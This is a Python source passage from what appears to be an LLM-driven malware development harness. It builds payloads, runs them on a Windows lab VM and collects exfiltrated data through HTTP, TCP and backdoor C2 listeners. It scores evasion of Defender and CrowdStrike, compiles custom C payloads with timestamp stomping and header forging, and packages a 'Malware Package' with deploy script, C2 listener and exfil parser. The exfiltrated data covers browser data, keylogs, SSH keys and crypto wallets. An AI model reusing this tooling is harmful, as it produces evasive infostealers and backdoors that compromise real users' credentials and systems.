        if is_script_recipe:
            if protocol != "http":
                logger.info("Overriding protocol %s -> http for JScript/VBS recipe %s",
                            protocol, self._last_recipe)
            protocol = "http"
        elif protocol == "auto" or (protocol != "auto" and exfil and self._protocol_mismatches(protocol, exfil)):
            if protocol != "auto":
                logger.info("Overriding LLM protocol %s -> auto (exfil is %s)", protocol, exfil)
            if self._is_backdoor:
                protocol = "backdoor"
            elif exfil and "http" in exfil:
                protocol = "http"
            else:
                protocol = "tcp"
        if protocol == "backdoor" and timeout < 120:
            logger.info("Backdoor C2 requires >=120s timeout (was %ds), overriding", timeout)
            timeout = 120
        logger.info("Starting %s C2 listener on port %d (timeout=%ds)", protocol, port, timeout)

        if port in _c2_listeners:
            if port in _c2_servers:
                existing = _c2_listeners[port]
                return (
                    f"C2 listener already active on port {port} "
                    f"(started {existing.get('started', '?')}, "
                    f"{existing.get('requests', 0)} requests, "
                    f"{len(existing.get('data', b''))} bytes received)"
                )
            old = _c2_listeners.pop(port)
            _c2_locks.pop(port, None)
            logger.info("Cleaned up expired C2 listener on port %d (%d bytes collected)",
                        port, len(old.get("data", b"")))

        _c2_locks[port] = threading.Lock()
        _c2_stop_events[port] = threading.Event()
        _c2_listeners[port] = {
            "data": b"",
            "requests": 0,
            "started": datetime.now().isoformat(),
            "protocol": protocol,
        }

        if protocol == "backdoor":
            target_fn = _run_backdoor_c2
        elif protocol == "tcp":
            target_fn = _run_tcp_c2
        else:
            target_fn = _run_http_c2
        t = threading.Thread(target=target_fn, args=(port, timeout), daemon=True)
        t.start()
        _c2_listeners[port]["thread"] = t

        await asyncio.sleep(1.0)

        if port not in _c2_servers:
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            _c2_stop_events.pop(port, None)
            return f"ERROR: C2 listener failed to bind on port {port} — address in use. Call cleanup_vm() first to free the port."

        return f"C2 {protocol.upper()} listener started on port {port} (timeout {timeout}s)"

    async def tool_execute_on_vm(self, command: str) -> str:
        if self._quarantine_locked:
            return ("BLOCKED: Last binary was quarantined. VM commands are locked until you "
                    "build a new binary. Call mutate_recipe or create_recipe with different "
                    "evasion/chunks, then assemble to unlock.")
        logger.info("Executing on VM: %s", command[:100])
        stdout, stderr, rc = await self._ssh_exec(command, timeout=60)
        lines = [f"Exit code: {rc}"]
        if stdout.strip():
            lines.append(f"stdout:\n{stdout[:3000]}")
        if stderr.strip():
            lines.append(f"stderr:\n{stderr[:1000]}")
        return self._truncate("\n".join(lines), 1500, "execute_on_vm")

    # ── Analysis ─────────────────────────────────────────────────────

    async def tool_check_c2_data(self, port: int = 9001) -> str:
        logger.info("Checking C2 data on port %d", port)

        if port not in _c2_listeners:
            return f"No C2 listener on port {port}"

        lock = _c2_locks.get(port)
        if lock:
            with lock:
                entry = _c2_listeners[port]
                data = bytes(entry["data"])
                requests = entry["requests"]
                started = entry["started"]
        else:
            entry = _c2_listeners[port]
            data = bytes(entry["data"])
            requests = entry["requests"]
            started = entry["started"]

        total = len(data)
        lines = [
            f"C2 listener port {port}:",
            f"  Started: {started}",
            f"  Requests: {requests}",
            f"  Total bytes: {total}",
        ]

        if total > 0:
            bd_results = entry.get("backdoor_results", [])
            if bd_results:
                beacons = entry.get("backdoor_beacons", 0)
                lines.append(f"  Backdoor beacons: {beacons}")
                lines.append(f"  Command results: {len(bd_results)}")
                for r in bd_results:
                    lines.append(f"    {r['cmd']}: {r['size']}B")
                    if r['preview'].strip():
                        for pline in r['preview'].split('\n')[:5]:
                            if pline.strip():
                                lines.append(f"      {pline.rstrip()}")
            else:
                preview = data[:500]
                printable = "".join(chr(b) if 32 <= b < 127 else "." for b in preview)
                lines.append(f"  Preview (first 500 bytes): {printable}")

                sections = []
                text = data.decode("utf-8", errors="replace")
                for marker in [
                    "[SYSINFO]", "[PROCESSES]", "[ENV]", "[BROWSERS]",
                    "[WIFI]", "[CLIPBOARD]", "[DISCORD]", "[SSH]",
                    "[CLOUD]", "[CRYPTO]", "[TELEGRAM]", "[FTP]",
                    "[SCREENSHOT]", "[SOFTWARE]", "[NETWORK]",
                    "[KEYLOG]", "[DRIVES]", "[STARTUP]", "[RECENT]",
                    "[SECURITY]", "[SCHEDULED]", "[ACTIVE_WIN]",
                ]:
                    if marker in text:
                        sections.append(marker)
                if sections:
                    lines.append(f"  Data sections found: {', '.join(sections)}")

        return "\n".join(lines)

    async def tool_analyze_results(self, binary_name: str, c2_port: int = 9001) -> str:
        logger.info("Analyzing results for %s (C2 port %d)", binary_name, c2_port)

        if self._is_backdoor and c2_port in _c2_listeners:
            c2_thread = _c2_listeners[c2_port].get("thread")
            if c2_thread and c2_thread.is_alive():
                logger.info("Waiting for backdoor C2 to finish command exchange (up to 120s)...")
                await asyncio.to_thread(c2_thread.join, timeout=120)
                logger.info("Backdoor C2 thread done (alive=%s)", c2_thread.is_alive())
        else:
            await asyncio.sleep(5)

        binary_check, _, _ = await self._ssh_exec(
            f'dir "C:\\Users\\{self.vm_user}\\Desktop\\{binary_name}"',
            timeout=10,
        )
        binary_exists = (
            binary_name.lower() in binary_check.lower()
            and "File Not Found" not in binary_check
        )

        c2_report = await self.tool_check_c2_data(port=c2_port)
        c2_bytes = 0
        if c2_port in _c2_listeners:
            lock = _c2_locks.get(c2_port)
            if lock:
                with lock:
                    c2_bytes = len(_c2_listeners[c2_port].get("data", b""))
            else:
                c2_bytes = len(_c2_listeners[c2_port].get("data", b""))

        edr_report = await self.tool_list_edr_events(minutes=5)

        defender_detections = []
        cs_detections = []

        # Check for actual Defender threat detections (not event log noise)
        defender_threats_out, _, _ = await self._ssh_exec(
            'powershell -c "Get-MpThreatDetection | '
            'Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) } | '
            'Select-Object ThreatID,Resources,InitialDetectionTime | Format-List"',
            timeout=15,
        )
        if defender_threats_out.strip():
            for line in defender_threats_out.split("\n"):
                stripped = line.strip()
                if stripped and ":" in stripped:
                    defender_detections.append(stripped)

        for line in edr_report.split("\n"):
            low = line.lower()
            if ("crowdstrike" in low or "falcon" in low) and \
               any(kw in low for kw in ["trojan", "hacktool", "malware", "quarantine", "blocked", "killed"]):
                cs_detections.append(line.strip())

        ext = Path(binary_name).suffix.lower()
        format_type = {".js": "jscript", ".vbs": "vbscript", ".bat": "batch"}.get(ext, "c")

        bd_beacons = 0
        bd_result_count = 0
        if self._is_backdoor and c2_port in _c2_listeners:
            entry = _c2_listeners[c2_port]
            bd_beacons = entry.get("backdoor_beacons", 0)
            bd_result_count = entry.get("backdoor_result_count", 0)

        result = classify_failure(
            binary_exists=binary_exists,
            c2_bytes=c2_bytes,
            defender_detections=defender_detections,
            cs_detections=cs_detections,
            exit_code=0,
            stderr="",
            stdout="",
            format_type=format_type,
            is_backdoor=self._is_backdoor,
            backdoor_beacons=bd_beacons,
            backdoor_results=bd_result_count,
        )

        lines = [
            "=== Analysis Results ===",
            f"Binary: {binary_name}",
            f"Binary exists on VM: {binary_exists}",
            f"C2 data received: {c2_bytes} bytes",
            *(([f"Backdoor beacons: {bd_beacons}",
                f"Backdoor command results: {bd_result_count}/3 expected"] if self._is_backdoor else [])),
            f"Defender detections: {len(defender_detections)}",
            f"CrowdStrike detections: {len(cs_detections)}",
            "",
            f"Verdict: {result.failure_type.value}",
            f"Detail: {result.detail}",
            f"Suggested action: {result.suggested_action}",
            "",
            "--- C2 Report ---",
            c2_report,
        ]

        if defender_detections:
            lines.append("\n--- Defender Detections ---")
            for d in defender_detections[:5]:
                lines.append(f"  {d}")
        if cs_detections:
            lines.append("\n--- CrowdStrike Detections ---")
            for d in cs_detections[:5]:
                lines.append(f"  {d}")

        self._save_recipe_result(
            binary_name=binary_name,
            verdict=result.failure_type.value,
            c2_bytes=c2_bytes,
            binary_exists=binary_exists,
            detections=len(defender_detections) + len(cs_detections),
        )

        is_pass = result.failure_type.value == "SUCCESS" and binary_exists and \
                   len(defender_detections) == 0 and len(cs_detections) == 0
        if not is_pass:
            failure_desc = (
                f"Recipe={self._last_recipe}: {result.failure_type.value} — "
                f"{result.detail} (c2={c2_bytes}b, binary={'exists' if binary_exists else 'GONE'}, "
                f"detections={len(defender_detections)+len(cs_detections)})"
            )
            self._epoch_failures.append(failure_desc)
        else:
            self._epoch_call_count = 0
            self._epoch_failures.clear()

        return "\n".join(lines)

    def _save_recipe_result(self, binary_name: str, verdict: str, c2_bytes: int,
                            binary_exists: bool, detections: int):
        """Append test result to recipe_results.json for future reference."""
        import json
        rr_path = Path(self.recipes_dir).parent.parent.parent / "results" / "recipe_results.json"
        try:
            data = json.loads(rr_path.read_text()) if rr_path.exists() else {"results": []}
        except Exception:
            data = {"results": []}

        is_pass = verdict == "SUCCESS" and binary_exists and detections == 0
        edr = getattr(self, "_current_edr", "unknown")

        entry = {
            "recipe": getattr(self, "_last_recipe", binary_name),
            "verdict": "PASS" if is_pass else f"FAIL_{verdict}",
            "edr": edr,
            "binary_size": 0,
            "c2_bytes": c2_bytes,
            "format": {".js": "jscript", ".vbs": "vbscript", ".bat": "batch"}.get(
                Path(binary_name).suffix.lower(), "pe_resources"),
            "date": datetime.now().strftime("%Y-%m-%d"),
        }
        data["results"].append(entry)

        try:
            rr_path.write_text(json.dumps(data, indent=2))
            logger.info("Saved recipe result: %s = %s", entry["recipe"], entry["verdict"])
        except Exception as e:
            logger.warning("Could not save recipe result: %s", e)

    # ── Cleanup ──────────────────────────────────────────────────────

    async def tool_cleanup_vm(self) -> str:
        """Tool: clean VM via SSH — kill processes, delete binaries, reset C2."""
        return await self._cleanup_vm_ssh()

    async def _cleanup_vm_ssh(self, fallback_snapshot: str = "crowdstrike") -> str:
        """Clean VM via SSH and kill stale C2 listeners."""
        for port in list(_c2_listeners.keys()):
            stop_ev = _c2_stop_events.pop(port, None)
            if stop_ev:
                stop_ev.set()
            srv = _c2_servers.pop(port, None)
            if srv:
                try:
                    if hasattr(srv, 'server_close'):
                        srv.server_close()
                    elif hasattr(srv, 'close'):
                        srv.close()
                except Exception:
                    pass
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            logger.info("Killed stale C2 listener on port %d", port)
        import subprocess
        subprocess.run(["fuser", "-k", "9001/tcp"], capture_output=True, timeout=5)
        await asyncio.sleep(0.5)

        cleanup_cmds = [
            'taskkill /f /im payload.exe 2>nul',
            'taskkill /f /im keylogger.exe 2>nul',
            'taskkill /f /im backdoor.exe 2>nul',
            'taskkill /f /im cscript.exe 2>nul',
            'taskkill /f /im wscript.exe 2>nul',
            'del "C:\\Users\\vmuser\\Desktop\\*.exe" 2>nul',
            'del "C:\\Users\\vmuser\\Desktop\\*.js" 2>nul',
            'del "C:\\Users\\vmuser\\Desktop\\*.vbs" 2>nul',
            'del "C:\\Users\\vmuser\\Desktop\\*.bat" 2>nul',
            'taskkill /f /im cmd.exe 2>nul',
            'schtasks /delete /tn keylog_test /f 2>nul',
            'schtasks /delete /tn backdoor_test /f 2>nul',
            'echo CLEANUP_DONE',
        ]
        cmd_str = " & ".join(cleanup_cmds)
        out, err, rc = await self._ssh_exec(cmd_str, timeout=15)
        if "CLEANUP_DONE" in out:
            logger.info("VM cleaned via SSH")
            return "OK — VM cleaned (processes killed, binaries deleted, tasks removed, C2 listeners reset)"

        if rc == -1:
            logger.warning("SSH cleanup failed (VM unreachable), attempting VM restart via snapshot restore")
            import subprocess
            script = Path(self.chunks_dir).parent / "scripts" / "vm_snapshot.sh"
            if script.exists():
                try:
                    proc = await asyncio.create_subprocess_exec(
                        str(script), "restore", fallback_snapshot,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    snap_out, snap_err = await asyncio.wait_for(proc.communicate(), timeout=180)
                    snap_text = snap_out.decode(errors="replace")
                    if proc.returncode == 0:
                        logger.info("VM restored via snapshot (SSH was down)")
                        return f"OK — VM restored via snapshot '{fallback_snapshot}' (SSH was down, full restart performed)"
                    else:
                        return (
                            f"ERROR: VM unreachable AND snapshot restore failed. "
                            f"Script output: {snap_text[:300]}. "
                            f"The VM needs manual intervention. Do NOT keep retrying — "
                            f"report this to the user and stop the campaign."
                        )
                except asyncio.TimeoutError:
                    return "ERROR: VM snapshot restore timed out (180s). VM needs manual intervention. Stop retrying."
                except Exception as e:
                    return f"ERROR: VM restart failed: {e}. VM needs manual intervention. Stop retrying."
            else:
                return (
                    f"ERROR: VM unreachable (SSH down) and no snapshot script found. "
                    f"VM needs manual intervention. Do NOT keep retrying."
                )

        logger.warning("VM cleanup uncertain: %s", out[:200])
        return f"cleanup ran but CLEANUP_DONE not found: {out[:200]}"

    # ── Innovation Mode Tools ────────────────────────────────────────

    def _ensure_scratch(self) -> Path:
        """Get or create the experimental code scratch directory."""
        scratch = getattr(self, "_innovation_scratch", None)
        if not scratch:
            from datetime import datetime as dt
            ts = dt.now().strftime("%Y%m%d_%H%M%S")
            scratch = str(Path(self.results_dir) / "innovations" / f"experiment_{ts}")
            self._innovation_scratch = scratch
        p = Path(scratch)
        p.mkdir(parents=True, exist_ok=True)
        return p

    async def tool_write_experimental_code(self, code: str, filename: str = "experiment.c") -> str:
        """Write custom C source code. Use when recipes/chunks aren't enough — craft your own payload from scratch."""
        scratch = self._ensure_scratch()
        out_path = scratch / filename
        out_path.write_text(code)
        logger.info("Wrote experimental code: %s (%d chars)", out_path, len(code))
        return f"Written: {out_path} ({len(code)} chars)"

    async def tool_compile_experimental(self, filename: str = "experiment.c",
                                         output: str = "experiment.exe") -> str:
        """Compile custom C code with MinGW. Injects Rich header and stomps PE timestamp."""
        scratch = self._ensure_scratch()
        source = scratch / filename
        if not source.exists():
            return f"ERROR: Source not found: {source}"

        exe_path = scratch / output
        chunks_dir = Path(self.chunks_dir)

        cmd = [
            "x86_64-w64-mingw32-gcc", "-mwindows",
            f"-I{chunks_dir / 'process'}",
            f"-I{chunks_dir / 'evasion'}",
            f"-I{chunks_dir / 'api_resolve'}",
            f"-I{chunks_dir}",
            "-o", str(exe_path), str(source),
            "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32",
            "-lgdi32", "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32",
            "-luser32", "-lwldap32", "-lnetapi32", "-lmpr",
            "-static", "-s", "-Wl,--strip-all",
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return "ERROR: Compilation timed out"

        out = stdout.decode("utf-8", errors="replace")
        err = stderr.decode("utf-8", errors="replace")

        if proc.returncode != 0:
            return self._truncate(f"COMPILE ERROR (rc={proc.returncode}):\n{err}\n{out}", 2000, "compile_experimental")

        # Inject Rich header + stomp timestamp
        import sys
        sys.path.insert(0, str(chunks_dir.parent))
        from chunks.assembler import inject_rich_header, stomp_pe_timestamp
        stomp_pe_timestamp(str(exe_path))
        inject_rich_header(str(exe_path))

        size = os.path.getsize(str(exe_path))
        logger.info("Compiled experimental: %s (%d bytes)", exe_path, size)
        return f"Compiled: {exe_path} ({size} bytes)"

    async def tool_save_innovation_report(self, technique: str, success: bool,
                                           notes: str = "") -> str:
        """Save innovation mode report and exit innovation mode."""
        scratch = getattr(self, "_innovation_scratch", None)
        if not scratch:
            return "ERROR: Not in innovation mode."

        report = {
            "technique": technique,
            "success": success,
            "notes": notes,
        }

        report_path = Path(scratch) / "REPORT.md"
        report_text = (
            f"# Innovation Report\n\n"
            f"**Technique:** {technique}\n"
            f"**Result:** {'SUCCESS' if success else 'FAILED'}\n\n"
            f"## Notes\n{notes}\n"
        )
        report_path.write_text(report_text)

        files = [f.name for f in Path(scratch).iterdir()]
        logger.info("Innovation report saved: %s (success=%s)", report_path, success)

        self._innovation_scratch = None
        return (f"Report saved: {report_path}\n"
                f"Files in experiment dir: {', '.join(files)}\n"
                f"Innovation mode exited. Returning to normal template operations.")

    def stop_c2_listener(self, port: int = 9001):
        server = _c2_servers.pop(port, None)
        if server:
            if isinstance(server, HTTPServer):
                try:
                    server.shutdown()
                except Exception:
                    pass
            elif isinstance(server, socket.socket):
                try:
                    server.close()
                except OSError:
                    pass
        _c2_listeners.pop(port, None)
        _c2_locks.pop(port, None)
        logger.info("Stopped C2 listener on port %d", port)

    def package_success(self, c2_bytes: int = 0) -> str:
        """Generate deploy scripts and README in the output dir after a successful campaign."""
        if self._last_output_dir:
            result_dir = Path(self._last_output_dir)
        else:
            result_dir = Path(self.results_dir) / "latest"
            if result_dir.is_symlink():
                result_dir = result_dir.resolve()
        if not result_dir.exists():
            return ""

        recipe_path = result_dir / "recipe.yaml"
        if not recipe_path.exists():
            return ""

        with open(recipe_path) as f:
            recipe_data = yaml.safe_load(f)

        exfil = recipe_data.get("exfil", "exfil/tcp_direct")
        is_jscript = recipe_data.get("format") == "jscript"
        is_http = "http" in exfil
        c2_port = recipe_data.get("vars", {}).get("C2_PORT", "9001")
        c2_ip = recipe_data.get("vars", {}).get("C2_IP", "10.0.2.2")
        recipe_name = recipe_data.get("name", self._last_recipe)
        evasion = recipe_data.get("evasion", [])

        # Determine payload filename
        payload = None
        for name in ("payload.exe", "payload.dll", "payload.cpl", "source.js", "source.vbs"):
            if (result_dir / name).exists():
                payload = name
                break
        if not payload:
            return ""

        binary_size = (result_dir / payload).stat().st_size

        # Execution method
        if payload.endswith(".js"):
            exec_cmd = f'cscript //nologo //E:jscript "C:\\Users\\%VM_USER%\\Desktop\\{payload}"'
        elif payload.endswith(".vbs"):
            exec_cmd = f'cscript //nologo "C:\\Users\\%VM_USER%\\Desktop\\{payload}"'
        elif payload.endswith(".dll"):
            exec_cmd = f'rundll32 "C:\\Users\\%VM_USER%\\Desktop\\{payload}",DllMain'
        elif payload.endswith(".cpl"):
            exec_cmd = f'control.exe "C:\\Users\\%VM_USER%\\Desktop\\{payload}"'
        else:
            exec_cmd = f'"C:\\Users\\%VM_USER%\\Desktop\\{payload}"'

        # deploy.sh
        deploy_sh = f'''#!/bin/bash
# Deploy script for {recipe_name}
# Generated by Hermes after successful campaign

VM_PORT=${{VM_PORT:-10022}}
VM_USER=${{VM_USER:-vmuser}}
VM_PASS=${{VM_PASS:-vmuser123}}
C2_PORT=${{C2_PORT:-{c2_port}}}
TIMEOUT=${{TIMEOUT:-120}}
DIR="$(cd "$(dirname "$0")" && pwd)"

SSH="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"

echo ""
echo "=== Deploying {recipe_name} ==="
echo "  Payload: {payload} ({binary_size} bytes)"
echo "  C2: {'HTTP' if is_http else 'TCP'} on :$C2_PORT"
echo ""

# Upload
echo "[1/4] Uploading..."
eval $SCP "$DIR/{payload}" "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\{payload}'" 2>/dev/null
if [ $? -ne 0 ]; then echo "FAILED: upload"; exit 1; fi

# Verify not quarantined
echo "[2/4] Checking quarantine..."
sleep 2
EXISTS=$(eval $SSH "'if exist C:\\Users\\$VM_USER\\Desktop\\{payload} (echo EXISTS) else (echo GONE)'" 2>/dev/null | tr -d '\\r')
if [ "$EXISTS" = "GONE" ]; then
    echo "QUARANTINED by EDR"
    exit 2
fi

# Start C2
echo "[3/4] Starting C2 listener on :$C2_PORT..."
fuser -k $C2_PORT/tcp 2>/dev/null
OUT="$DIR/exfil_$(date +%Y%m%d_%H%M%S).bin"
'''
        if is_http:
            deploy_sh += f'python3 "$DIR/c2_listener.py" $C2_PORT "$OUT" &\n'
        else:
            deploy_sh += 'timeout $TIMEOUT nc -l -p $C2_PORT > "$OUT" &\n'
        deploy_sh += f'''C2_PID=$!
sleep 1

# Execute
echo "[4/4] Executing on VM..."
eval $SSH "'{exec_cmd}'" >/dev/null 2>&1 &
wait $C2_PID 2>/dev/null

# Results
SIZE=$(stat -c%s "$OUT" 2>/dev/null || echo 0)
echo ""
echo "=== Results ==="
echo "  C2 data: $SIZE bytes -> $OUT"
if [ "$SIZE" -gt 100 ]; then
    echo "  Status: SUCCESS"
    echo "  Sections:"
    strings "$OUT" | grep "^===" | sed 's/^/    /'
else
    echo "  Status: NO DATA"
fi
'''
        (result_dir / "deploy.sh").write_text(deploy_sh)
        os.chmod(result_dir / "deploy.sh", 0o755)

        # c2_listener.py (HTTP)
        c2_py = f'''#!/usr/bin/env python3
"""C2 listener for {recipe_name}."""
import socket, sys, os, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

port = int(sys.argv[1]) if len(sys.argv) > 1 else {c2_port}
out = sys.argv[2] if len(sys.argv) > 2 else f"exfil_{{datetime.datetime.now():%Y%m%d_%H%M%S}}.bin"
data = bytearray()

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        if n: data.extend(self.rfile.read(n))
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *a): pass

if __name__ == "__main__":
    print(f"C2 HTTP on :{{port}}")
    try:
        HTTPServer(("0.0.0.0", port), H).serve_forever()
    except KeyboardInterrupt:
        pass
    with open(out, "wb") as f: f.write(data)
    print(f"Saved {{len(data)}} bytes -> {{out}}")
'''
        (result_dir / "c2_listener.py").write_text(c2_py)
        os.chmod(result_dir / "c2_listener.py", 0o755)

        # c2_listener.sh (TCP)
        c2_sh = f'''#!/bin/bash
PORT=${{1:-{c2_port}}}
OUT="${{2:-exfil_$(date +%Y%m%d_%H%M%S).bin}}"
echo "C2 TCP on :$PORT -> $OUT"
nc -l -p $PORT > "$OUT"
SIZE=$(stat -c%s "$OUT" 2>/dev/null || echo 0)
echo "Received: $SIZE bytes"
[ "$SIZE" -gt 100 ] && strings "$OUT" | head -20
'''
        (result_dir / "c2_listener.sh").write_text(c2_sh)
        os.chmod(result_dir / "c2_listener.sh", 0o755)

        # parse_exfil.py
        parse_py = '''#!/usr/bin/env python3
"""Parse exfil .bin into individual section files."""
import sys, os, re

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <exfil.bin>")
    sys.exit(1)

data = open(sys.argv[1], "rb").read()
text = data.decode("utf-8", errors="replace")
sections = re.split(r"(?=^=== .+ ===$)", text, flags=re.MULTILINE)
outdir = os.path.splitext(sys.argv[1])[0] + "_parsed"
os.makedirs(outdir, exist_ok=True)

for s in sections:
    s = s.strip()
    if not s:
        continue
    m = re.match(r"=== (.+) ===", s)
    name = m.group(1).lower().replace(" ", "_") if m else "unknown"
    path = os.path.join(outdir, f"{name}.txt")
    with open(path, "w") as f:
        f.write(s)
    print(f"  {name}: {len(s)} bytes -> {path}")

print(f"\\nParsed {len([s for s in sections if s.strip()])} sections -> {outdir}/")
'''
        (result_dir / "parse_exfil.py").write_text(parse_py)
        os.chmod(result_dir / "parse_exfil.py", 0o755)

        # README.txt
        readme = f"""Malware Package: {recipe_name}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}
Binary: {payload} ({binary_size} bytes)
Evasion: {', '.join(evasion) if evasion else 'none'}
C2: {'HTTP' if is_http else 'TCP'} on {c2_ip}:{c2_port}
Validation: PASS — {c2_bytes} bytes exfiltrated, 0 detections

== Quick Deploy ==
  ./deploy.sh

== Manual ==
  1. Start C2:   ./c2_listener.{'py' if is_http else 'sh'}
  2. Upload:     scp -P 10022 {payload} vmuser@localhost:Desktop/
  3. Execute:    ssh -p 10022 vmuser@localhost '{exec_cmd}'
  4. Parse:      python3 parse_exfil.py exfil_*.bin
"""
        (result_dir / "README.txt").write_text(readme)

        # Save C2 capture if available
        for port_num, info in _c2_listeners.items():
            if info.get("data"):
                cap_path = result_dir / f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
                cap_path.write_bytes(info["data"])
                logger.info("Saved C2 capture: %s (%d bytes)", cap_path, len(info["data"]))

        files = [f.name for f in result_dir.iterdir()]
        logger.info("Package created: %s (%s)", result_dir, ", ".join(files))
        return str(result_dir)
